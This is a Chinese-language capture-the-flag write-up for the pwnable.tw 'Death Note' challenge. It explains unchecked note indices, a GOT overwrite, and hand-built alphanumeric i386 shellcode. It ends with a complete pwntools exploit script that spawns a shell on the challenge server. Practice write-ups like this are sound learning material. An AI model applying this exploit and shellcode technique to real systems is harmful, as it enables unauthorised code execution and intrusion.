---
title: Death Note
categories:
- pwnable.tw
---
# pwnable.tw->Death Note

## 前言

又是花了两天+做出来的题，所幸这次没看别人的writeup，师姐提示了一下，昨晚肝出来的时候有种打了两天加时最后绝杀的感觉。这基本是纯考alphanumeric shellcode的题，动手看和写很重要

## 程序逻辑

程序有三个功能，Add、Show和Delete。其中Add、Delete和Show都没有对Index检查，会造成越界读写，范围是比Note_addr低的地址

![main](./1.jpg)

Add可以被用来覆写got表或者plt表

![add](./2.jpg)

Show可以被用来泄露函数地址，进而得到Libc地址，这个题没有给Libc，可以考虑用DynELF或者Libcsearcher，这个后面再分析

![show](./3.jpg)

del同样没有检查index，可以把任意地址的内容作为一个chunk释放

![del](./4.jpg)

## 漏洞利用

开始考虑把libc版本猜出来，DynELF要求的是泄露任意地址的值，但是我们这里的Show是%s输出，并不满足其要求，对于Libcsearcher，我尝试使用read和printf和free的地址做泄露，出来的地址算出来的libc版本没有交集，不太明白这是怎么做到的，不过这条路似乎不通了。

![addr](./5.jpg)

![addr2](./6.jpg)

另一条路出现在Gdb调试的时候，发现heap，bss后面的权限都是rwxp，可读可写可执行，我们可以根据Index的问题在某个函数比如free的got表上malloc一个新的chunk，这个chunk的内容是shellcode，在调用free@got的时候就会去shellcode执行，注意这时候的is_printable限制输入只能使用可见字符，我们可以在[reference](https://nets.ec/Ascii_shellcode)去找下可以用的字符，以及这个更全的[opcode](http://sparksandflames.com/files/x86InstructionChart.html)结合调试写shellcode。

![rwxp](./7.jpg)

### shellcode编写

我们最终的目的是构造system("/bin//sh",0,0)，即eax = 0xb,ebx = binsh_addr，ecx = edx = 0。int 0x80其中eax = 0可以使用
```asm
push 0x30;
pop eax;
xor al,0x30;
```
来完成，为了抬高栈(减小esp从而让之后的寻址偏移大于0x1F)

ebx = esp可以用
```asm
push 0x68732f2f;
push 0x6e69622f;
push esp;
pop ebx;
```
al = 0xb可以按照刚才方法给eax清零之后inc11次
```asm
push 0x30;
pop eax;
xor al,0x30;
inc eax;
...
```

int 0x80可以使用edx作为跳板，开始根据偏移存储text_code地址，之后用xor把int 0x80(0xcd80)写到将要执行的最后一条指令
```asm
xor edx,[ebx+0x30];
xor [edx+0x38],di;
```

由于全程没用ecx，所以ecx一直为0
xor edx,[ebx+0x30];将edx清零，之后int 0x80执行sys_ececv("/bin/sh\x00")

## exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='i386',os='linux',log_level="debug")
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./death_note')
note_addr = 0x0804a060

if debug:
    p = process('./death_note')
    gdb.attach(p)
else:
    p = remote('chall.pwnable.tw',10201)

def AddNote(index,name):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Index :')
    p.sendline(str(index))
    p.recvuntil('Name :')
    p.send(name)

def ShowNote(index):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))

def leak(address):
    index = (address - 0x0804a060) / 4
    ShowNote(index)
    p.recvuntil('Name : ')
    data = u32(p.recv(4))
    return data


def DeleteNote(index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))

def Exit():
    p.recvuntil('Your choice :')
    p.sendline('4')

def Index(address):
    return (address-note_addr) / 4

def exp():
    #leak libc
    free_got = 0x0804A014
    shellcode = asm('push 0x30;pop eax;xor al, 0x30;push eax;')
    shellcode += asm('pusha')
    shellcode += asm('push 0x68732f2f;push 0x6e69622f;')
    shellcode += asm('push esp;pop ebx;')
    shellcode += asm('dec eax;xor ax,0x4f65;xor ax,0x3057;')
    shellcode += asm('push eax;pop edi;')
    shellcode += asm('push 0x30;pop eax;xor al,0x30;')
    for i in range(11):
        shellcode += asm('inc eax;')
    shellcode += asm('xor edx,[ebx+0x30];')
    shellcode += asm('xor [edx+0x38],di;')
    shellcode += asm('xor edx,[ebx+0x30];')
    #shellcode += asm('inc eax;dec eax;inc eax;dec eax;')#junk
    #shellcode += asm('push 0x30;pop eax;xor al,0x30;push eax;inc eax;')
    #shellcode += asm('pop ebx;')
    print len(shellcode)
    AddNote(Index(free_got),shellcode+'\n')
    DeleteNote(-19)
    p.interactive()

exp()

```
